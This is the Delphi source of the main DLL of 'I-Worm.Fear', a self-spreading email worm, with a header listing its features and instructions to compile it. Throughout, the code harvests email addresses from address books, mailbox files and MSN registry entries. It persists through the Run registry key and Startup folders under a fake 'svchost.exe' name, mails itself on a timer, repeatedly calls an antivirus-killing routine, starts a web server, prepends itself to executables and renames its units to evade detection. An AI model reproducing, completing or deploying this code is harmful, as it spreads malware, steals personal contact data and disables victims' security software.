   //******************************************************************************
   //**                             I-Worm.Fear                                  **
   //******************************************************************************
   //**           Please use "make.bat" If you want to compille it!!!            **
   //******************************************************************************
   //** - Infect LAN                                                             **
   //** - SMTP Engine                                                            **
   //** - Kill AV/FW                                                             **
   //** - Infect P2P (Kazaa, Edonkey, Morpheus, ...)                             **
   //** - Read email addresses from *.htm *.html *.dbx *.wab *.mbx *.tbb *.mai   **
   //**                             *.eml *.mbox                                 **
   //** - Get email addresses from Windows Messenger                             **
   //** - Search Email Addresses in Eudora Address Book                          **
   //** - Firewall Bypass                                                        **
   //** - Do not appar in task manager under 95/98/NT/2K/XP                      **
   //** - Encrypted Strings in EXE (Easy Encryption)                             **
   //** - Change EXE Size on P2P Network                                         **
   //** - Web-Server (Port:555)                                                  **
   //** - Prepend some files in windows dir + prepend all .exe files in shared   **
   //**   dirs if they are smaller than 5MB                                      **
   //**                                                                          **
   //** Big thanks goes to:                                                      **
   //**                  Aphex     -- for dll injection source                   **
   //**                  ~LOM~     -- for webserver source                       **
   //**                  NiklauS   -- for prepender source                       **
   //******************************************************************************

   {$I CompMode.INI}

   LIBRARY Fear_DLL;

   {$IFDEF Debug}
   uses
     AclUtils in 'ACLUnits\ACLUTILS.PAS',
     Registry in 'ACLUnits\REGISTRY.PAS',
     P2P in 'P2P.PAS',
     LAN in 'LAN.PAS',
     Utils in 'UTILS.PAS',
     Email in 'EMAIL.PAS',
     KillAV in 'KILLAV.PAS',
     GetProc in 'GETPROC.PAS',
     MXLookup in 'MXLookup.PAS',
     ExtractDBX in 'ExtractDBX.PAS',
     Webserver in 'WEBSERVER.PAS',
     Sockets in 'SOCKETS.PAS',
     Prepender in 'PREPENDER.PAS',
     StrList in 'STRLIST.PAS',
     Windows;

   {$ELSE}
   USES
   //Delphi put original name of units into the end of .exe file. I do not want to
   //display KillAV, P2P, Email, etc strings at the end of the generated file,
   //therefore I rename the units before compille.
     B1 in 'ACLUnits\B1.PAS',                                                      {ACLUTILS}
     B3 in 'ACLUnits\B3.PAS',                                                      {REGISTRY}
     A8 in 'TEMP\A8.PAS',                                                          {P2P}
     A7 in 'TEMP\A7.PAS',                                                          {LAN}
     A6 in 'TEMP\A6.PAS',                                                          {Utils}
     A1 in 'TEMP\A1.PAS',                                                          {Email}
     A5 in 'TEMP\A5.PAS',                                                          {KillAV}
     A3 in 'TEMP\A3.PAS',                                                          {GetProc}
     A4 in 'TEMP\A4.PAS',                                                          {MXLookup}
     A2 in 'TEMP\A2.PAS',                                                          {ExtractDBX}
     A9 in 'TEMP\A9.PAS',                                                          {WebServer}
     A10 in 'TEMP\A10.PAS',                                                        {Sockets}
     A11 in 'TEMP\A11.PAS',                                                        {Prepender}
     A12 in 'TEMP\A12.PAS',                                                        {StrList}
     Windows;
   {$ENDIF}

   VAR
     FearRegKey         : STRING;
     ErrorMessageThread : THandle;
     SentEmail          : WORD = 0;
     SendMailBusy       : BOOL = False;
     WebServerWorking   : BOOL = False;

   CONST
     KILL_AV_INTERVALL     = 06000; // (= 06 sec) [milisec]
     SEND_EMAIL_INTERVALL  = 30000; // (= 30 sec) [milisec]

   PROCEDURE QuickSort(Left,Right:WORD);
   VAR
     Up,Down : WORD;
     Compare : STRING;
     S       : STRING;
   BEGIN
     Up:=Left;
     Down:=Right;
     Compare:=Emails[(Left+Right) DIV 2];
     REPEAT
       WHILE Emails[Up]<Compare DO Inc(Up);
       WHILE Compare<Emails[Down] DO Dec(Down);
       IF Up<=Down THEN BEGIN
         S:=Emails[Up];
         Emails[Up]:=Emails[Down];
         Emails[Down]:=S;
         Inc(Up);
         Dec(Down);
       END;
     UNTIL Up>Down;
     IF Left<Down THEN QuickSort(Left,Down);
     IF Up<Right  THEN QuickSort(Up,Right);
   END;

   PROCEDURE ShortEmails;
   VAR
     I : Longint;
     K : Longint;
   BEGIN
     IF NumberOfEmails>1 THEN BEGIN
       QuickSort(1,NumberOfEmails-1);
       FOR I:=NumberOfEmails-2 DOWNTO 0 DO BEGIN
         IF Emails[I]=Emails[I+1] THEN BEGIN
           FOR K:=I TO NumberOfEmails-2 DO Emails[K]:=Emails[K+1];
           Dec(NumberOFEmails);
         END;
       END;
     END;
   END;

   PROCEDURE InfectStartUpDir;
   VAR
     I : BYTE;
     S : STRING;
   BEGIN
     FOR I:=0 TO 1 DO BEGIN
       Reg.RootKey:=HKEY_CURRENT_USER+I;
       Reg.OpenKey(MainStr(47)+MainStr(29),True);                                  //"Windows\CurrentVersion\explorer\Shell Folders"
       IF Reg.KeyExists(MainStr(27+I*3)) THEN BEGIN
         S:=Reg.ReadString(MainStr(27+I*3))+'\';                                   //"Startup","Common Startup"
         IF S<>'' THEN CopyFiles(True,S+RandomFileName);
       END;
       Reg.CloseKey;
     END;
   END;

   PROCEDURE SetFearRegKey;                                                        //Register a random file into registry
   VAR
     X : STRING;
   BEGIN
     Reg.RootKey:=HKEY_LOCAL_MACHINE;
     Reg.OpenKey(MainStr(47)+MainStr(35),True);                                    //"Windows\CurrentVersion\Run"
     X:=WinPath+RandomFileName;
     Reg.WriteString(Decodestring(Random(ItemsCountInEncodedString(TAVNAME)-1)+1,TAVNAME),X);
     Reg.CloseKey;
     CopyFiles(True,X);
   END;

   FUNCTION GetFearRegKey : STRING;
   VAR
     I    : WORD;
     O    : WORD;
     Keys : TStrlist;
   BEGIN
     Keys:=TStrList.Create;
     Reg.RootKey:=HKEY_LOCAL_MACHINE;
     Reg.OpenKey(MainStr(39),False);                                               //"\SOFTWARE"
     Reg.GetKeyNames(Keys);
     FOR I:=0 TO Keys.Count-1 DO
       FOR O:=1 TO ItemsCountInEncodedString(TAVNAME) DO
         IF Pos(Keys.Strings(I),DecodeString(O,TAVNAME))=1 THEN BEGIN
           Reg.OpenKey(MainStr(46)+Keys.Strings(I),False);                         //"\SOFTWARE\"
           IF(Reg.ValueExists(MainStr(38)))AND(Reg.ValueExists(MainStr(37))) THEN BEGIN //"Sent","email_num"
             RESULT:=Keys.Strings(I);
             Break;
           END;
         END;
     IF RESULT='' THEN RESULT:=DecodeString(Random(ItemsCountInEncodedString(TAVNAME)-1)+1,TAVNAME);
     Keys.Free;
     Reg.CloseKey;
   END;

   PROCEDURE GetMSNEmails;
   VAR
     I   : Longint;
     J   : Longint;
     P   : ARRAY [0..400] OF Char;
   BEGIN
     Reg.RootKey:=HKEY_CURRENT_USER;
     IF Reg.KeyExists(MainStr(36)) THEN BEGIN                                      //"\Software\Microsoft\MessengerService\ListCache\.NET Messenger Service"
       Reg.Openkey(MainStr(36),False);                                             //"\Software\Microsoft\MessengerService\ListCache\.NET Messenger Service"
       I:=0;
       WHILE Reg.ValueExists(MainStr(31)+IntToStr(I)) DO BEGIN                     //"Allow"
         J:=Reg.GetDataSize(MainStr(31)+IntToStr(I));                              //"Allow"
         IF J<>-1 THEN BEGIN
             Reg.ReadBinaryData(MainStr(31)+IntToStr(I),P,J);                      //"Allow"
             ClearEmail(STRING(P));
         END;
         INC(I);
       END;
     END;
     Reg.CloseKey;
   END;

   PROCEDURE ReadWAB(FileName:STRING);
   VAR
     F       : FILE;
     I       : DWORD;
     S       : STRING;
     N       : ARRAY[1..5] OF Char;
   BEGIN
     AssignFile(F,FileName);
     {$I-}
     Reset(F,1);
     IF IOResult=0 THEN BEGIN
       REPEAT
         BlockRead(F,N,2);
         IF N[1]+N[2]=#03#48 THEN BEGIN
           SetLength(S,Ord(N[2])+30);
           BlockRead(F,S[1],Ord(N[2])+30);
           Delete(S,1,3);
           FOR I:=1 TO Ord(N[2]) DO IF S[I]=#00 THEN Delete(S,I,1);
           FOR I:=1 TO Length(S) DO
             IF S[I]<chr(45) THEN BEGIN
               SetLength(S,I-1);
               Break;
             END;
           ClearEmail(S);
         END ELSE Seek(F,FilePos(F)-1);
       UNTIL FileSize(F)-FilePos(F)<6;
       CloseFile(F);
     END;
     {$I+}
   END;

   PROCEDURE WriteEmailsReg;
   VAR
     I : DWORD;
   BEGIN
     ShortEmails;
     Reg.RootKey:=HKEY_LOCAL_MACHINE;
     Reg.OpenKey(MainStr(46)+FearRegKey,True);                                     //"\Software\"
     IF NumberOfEmails>0 THEN FOR I:=0 TO NumberOfEmails-1 DO Reg.WriteString(IntToStr(I),Emails[I]);
     Reg.WriteInteger(MainStr(37),NumberOfEmails);                                   //"email_num"
     Reg.WriteInteger(MainStr(38),SentEmail);                                      //"sent"
     Reg.CloseKey;
   END;

   PROCEDURE ReadEmailsReg;
   VAR
     I : DWORD;
   BEGIN
     Reg.RootKey:=HKEY_LOCAL_MACHINE;
     IF Reg.OpenKey(MainStr(46)+FearRegKey,False) THEN BEGIN                       //"\Software\"
       IF Reg.KeyExists(MainStr(38)) THEN SentEmail:=Reg.ReadInteger(MainStr(38)); //"sent"
       IF Reg.KeyExists(MainStr(37)) THEN BEGIN
         I:=Reg.ReadInteger(MainStr(37));                                          //"email_num"
         IF I>0 THEN FOR I:=0 TO I-1 DO IF Reg.KeyExists(IntToStr(I)) THEN BEGIN
           Emails[NumberOfEmails]:=Reg.ReadString(IntToStr(I));
           Inc(NumberOfEmails);
         END;
       END;
     END;
     Reg.CloseKey;
   END;

   FUNCTION FirstRun : BOOL;
   BEGIN
     Reg.RootKey:=HKEY_LOCAL_MACHINE;
     Reg.OpenKey(MainStr(39),False);                                               //"\Software"
     RESULT:=NOT Reg.KeyExists(FearRegKey);
     Reg.CloseKey;
     Reg.OpenKey(MainStr(46)+FearRegKey,True);                                     //"\Software\"
     Reg.CloseKey;
   END;

   PROCEDURE SendMail;
   BEGIN
     IF(InternetGetConnectedState(NIL,0))AND(NumberOfEmails>0)AND(SendMailBusy=False) THEN BEGIN
       SendMailBusy:=True;
       IF SentEmail>NumberOfEmails-1 THEN SentEmail:=0;
       Reg.RootKey:=HKEY_LOCAL_MACHINE;
       Reg.OpenKey(MainStr(46)+FearRegKey,True);                                   //"\Software\"
       Reg.WriteInteger(MainStr(38),SentEmail);                                    //"Sent"
       Reg.CloseKey;
       TRY
         SendEmail(DecodeString(Random(ItemsCountInEncodedString(TSUBJECTS)-1)+1,TSUBJECTS),DecodeString(Random(ItemsCountInEncodedString(TBODYS)-1)+1,TBODYS),Emails[SentEmail],DecodeString(Random(ItemsCountInEncodedString(TATTACHMENTS)-1)+1,TATTACHMENTS)+'.'+DecodeString(Random(ItemsCountInEncodedString(TEXTENSIONS1)-1)+1,TEXTENSIONS1)+'.'+DecodeString(Random(ItemsCountInEncodedString(TEXTENSIONS2)-1)+1,TEXTENSIONS2));
         Inc(SentEmail);
       EXCEPT
       END;
       SendMailBusy:=False;
     END;
   END;

   PROCEDURE SearchEmailsInHTM(EFile:STRING);                                      //Search email address in html files
   VAR
     F : TextFile;
     I : WORD;
   BEGIN
     AssignFile(F,EFile);
     {$I-}
     Reset(F);
     IF IOResult=0 THEN BEGIN
       REPEAT
         ReadLn(F,EFile);
         IF IOResult=0 THEN BEGIN
           I:=Pos('LTO:',UpperCase(EFile));
           IF I>0 THEN BEGIN
             Delete(EFile,1,I+3);
             I:=Pos('"',EFile);
             IF I>0 THEN Delete(EFile,I,Length(EFile));
             ClearEmail(EFile);
           END;
         END;
       UNTIL EOF(F);
       CloseFile(F);
     END;
     {$I+}
   END;

   PROCEDURE GetEmailsFromMBX_TBB(FileName:STRING);
   LABEL
     Abort, Close, Continue;
   VAR
     F : TextFile;
     S : STRING;
     T : STRING;
     G : STRING;
     K : STRING;
     A : Byte;
     B : Byte;
     C : Byte;
     H : Byte;
     I : WORD;
   BEGIN
     H:=0;
     AssignFile(F,FileName);
     {$I-}
     Reset(F);
     IF IOResult<>0 THEN GOTO Abort;
     REPEAT
       ReadLn(F,S);
       IF Length(S)=0 THEN GOTO Continue;
       IF IOResult<>0 THEN GOTO Close;
       FOR C:=0 TO 3 DO BEGIN
         K:=MainStr(141+C);                                                        //141="To: ",142="From: ",143="cc: ",144="Cc: "
         IF Pos(K,S)=1 THEN BEGIN
           Delete(S,1,Pos(K,S)+Length(K)-1);
           IF Pos('<',S)>0 THEN BEGIN
             H:=0;
             REPEAT
               IF H=1 THEN BEGIN
                H:=0;
                 Readln(F,S);
                 IF IOResult<>0 THEN GOTO Close;
               END;
               REPEAT
                 A:=Pos('<',S);
                 B:=Pos('>',S);
                 T:=Copy(S,A+1,B-A-1);
                 ClearEmail(T);
                Delete(S,1,B);
               UNTIL Pos('<',S)=0;
               IF Pos(',',S)>0 THEN H:=1;
             UNTIL H=0;
           END ELSE IF Pos('@',S)>0 THEN BEGIN
             IF (C<>1) THEN BEGIN
               G:=S;
               WHILE G[Length(G)]=',' DO BEGIN
                 Readln(F,G);
                 IF IOResult<>0 THEN GOTO Close;
                 S:=S+G;
               END;
               REPEAT
                 A:=0;
                 REPEAT
                   INC(A);
                 UNTIL S[A]<>' ';
                 I:=Pos(',',S);
                 G:=Copy(S,A,I-A);
                 Delete(S,1,I);
                 I:=Pos(' ',G);
                 IF I>0 THEN SetLength(G,I);
                 ClearEmail(G)
               UNTIL Pos(',',S)=0;
               A:=0;
               REPEAT
                 INC(A);
               UNTIL S[A]<>' ';
               Delete(s,1,a-1);
               IF Pos(' ',S)>0 THEN SetLength(S,Pos(' ',S));
               ClearEmail(S)
             END;
           END;
         END;
       END;
     Continue:
     UNTIL EOF(F);
     Close:
     CloseFile(F);
     Abort:
     {$I+}
   END;

   PROCEDURE ReadEudora(FileName:STRING);                                          //Search email addresses if NNdbase.txt (Eudora Address Book)
   LABEL
     Abort;
   VAR
     F : TextFile;
     S : STRING;
     I : WORD;
     J : WORD;
   BEGIN
     AssignFile(F,FileName);
     {$I-}
     Reset(F);
     IF IOResult=0 THEN BEGIN
       REPEAT
         Readln(F,S);
         IF IOResult<>0 THEN GOTO Abort;
         IF(Length(S)>0)AND(S[1]='>')THEN BEGIN
           Delete(S,1,1);
           ClearEmail(S);
         END ELSE
         IF Pos(MainStr(74),S)>0 THEN BEGIN                                        //"alias "
           IF POS('"',S)>0 THEN BEGIN
             Delete(S,1,Pos('"',S));
             Delete(S,1,Pos('"',S)+1);
           END ELSE BEGIN
             Delete(S,1,Pos(' ',S));
             Delete(S,1,Pos(' ',S));
           END;
           REPEAT
             I:=Pos(',',S);
             IF I>0 THEN BEGIN
               ClearEmail(Copy(S,1,I-1));
               Delete(S,1,I);
             END ELSE BEGIN
               ClearEmail(S);
               S:='';
             END;
           UNTIL Length(S)=0;
         END;
         J:=Pos(MainStr(58),S);
         IF J>0 THEN BEGIN
           Delete(S,1,J+10);
           REPEAT
             I:=Pos(#03,S);
             IF I>0 THEN BEGIN
               ClearEmail(Copy(S,1,I-1));
               Delete(S,1,I);
             END ELSE BEGIN
               I:=Pos('>',S);
               ClearEmail(Copy(S,1,I-1));
               S:='';
             END;
           UNTIL Length(S)=0;
         END;
       UNTIL Eof(F);
       Abort:
       CloseFile(F);
     END;
     {$I-}
   END;

   PROCEDURE SearchInDir(Path:AnsiString);
   VAR
     D     : TSearchRec;
     Error : Integer;
     I     : BYTE;
     P     : BYTE;
     S     : STRING;
     N     : STRING;
   BEGIN
     FOR P:=1 TO 11 DO BEGIN
       CASE P OF
         1     : S:='*'+MainStr(5);                                                //".exe"
         2..3  : S:=MainStr(105+P);                                                //"htm","html"
         4     : S:=MainStr(77);                                                   //"NNdbase.txt"
         5     : S:=MainStr(125);                                                  //"wab"
         6     : S:=MainStr(106);                                                  //"dbx"
         7..11 : S:=MainStr(113+P);                                                //"mbx","tbb","eml","mai","mbox"
       END;
       IF (P<>4)AND(P<>1) THEN S:='*.'+S;
       Error:=FindFirst(Path+S,faAnyFile OR faHidden,D);
       WHILE Error=0 DO BEGIN
         N:=Path+D.Name;
         CASE P OF
           1     : FOR I:=126 TO 140 DO IF Pos(MainStr(I),UpperCase(D.Name))>0 THEN Prepend(StartEXEName,N);
           2..3  : SearchEmailsInHTM(N);
           4     : ReadEudora(N);
           5     : ReadWAB(N);
           6     : ExtrackEmailFromDBX(N);
           7..11 : GetEmailsFromMBX_TBB(N);
         END;
         Error:=FindNext(D);
       END;
     END;
     //////////////////////////////////////////////////////////////////////////////
     Error:=FindFirst(Path+'*.*',faDirectory OR faHidden,D);
     WHILE Error=0 DO BEGIN
       IF (D.Attr AND faDirectory>0)AND(D.Name[1]<>'.') THEN SearchInDir(Path+D.Name+'\');
       Error:=FindNext(D);
     END;
   END;

   PROCEDURE SearchAllDir;
   VAR
     I : BYTE;
   BEGIN
     FOR I:=Ord('c') TO Ord('z') DO IF GetDriveType(pChar(Chr(I)+':\'))=DRIVE_FIXED THEN SearchInDir(Chr(I)+':\');
   END;

   PROCEDURE StartWEB;                                                             //Start Web-Server
   BEGIN
     IF InternetGetConnectedState(NIL,0) THEN BEGIN
       IF(WebServerWorking=False)AND(NameToIP('')<>'') THEN BEGIN
         StartWSA;
         StartWebServer(WebPort,WinPath);
         WebServerWorking:=True;
       END;
     END ELSE WebServerWorking:=False;
   END;

   PROCEDURE InitTimers;
   BEGIN
     SetTimer(0,1,SEND_EMAIL_INTERVALL,@SendMail);
     SetTimer(0,2,KILL_AV_INTERVALL,@AVKiller);
     SetTimer(0,3,10000,@StartWeb);
   END;

   PROCEDURE ErrorMessage;
   BEGIN
     MessageBox(0,pChar(DecodeString(Random(ItemsCountInEncodedString(TERRORMESSAGES)-1)+1,TERRORMESSAGES)),'Error',MB_ICONHAND);
     ExitThread(ErrorMessageThread);
   END;

   PROCEDURE Main;                                                                 //Main part of the worm
   VAR
     Msg : TMsg;
   BEGIN
     InitProcesses;
     InitEmailProcesses;
     SetWinPath;
     Randomize;
     StartEXEName:=WinPath+MainStr(105);                                           //"svchost.exe"
     Reg:=TRG.Create;
     FearRegKey:=GetFearRegKey;
     AVKiller;
     IF FirstRun THEN BEGIN
       ErrorMessageThread:=BeginThread(NIL,0,@ErrorMessage,NIL,0,ThreadID);
       SetFearRegKey;
     END;
     InitPeerToPeer;
     InfectStartUpDir;
     ReadEmailsReg;
     SearchAllDir;
     GetMSNEmails;
     WriteEmailsReg;
     InitTimers;
     BeginThread(NIL,0,@RunThread,NIL,0,ThreadId);                                 //Start LAN
     WHILE GetMessage(Msg,0,0,0) DO DispatchMessage(Msg);
   END;

   PROCEDURE EntryPoint(Reason:DWORD); STDCALL;
   BEGIN
     IF Reason=1 THEN BeginThread(NIL,0,TFNThreadStartRoutine(@Main),NIL,0,ThreadID);
   END;

   BEGIN
     DLLProc:=@EntryPoint;
     EntryPoint(1);
   END.
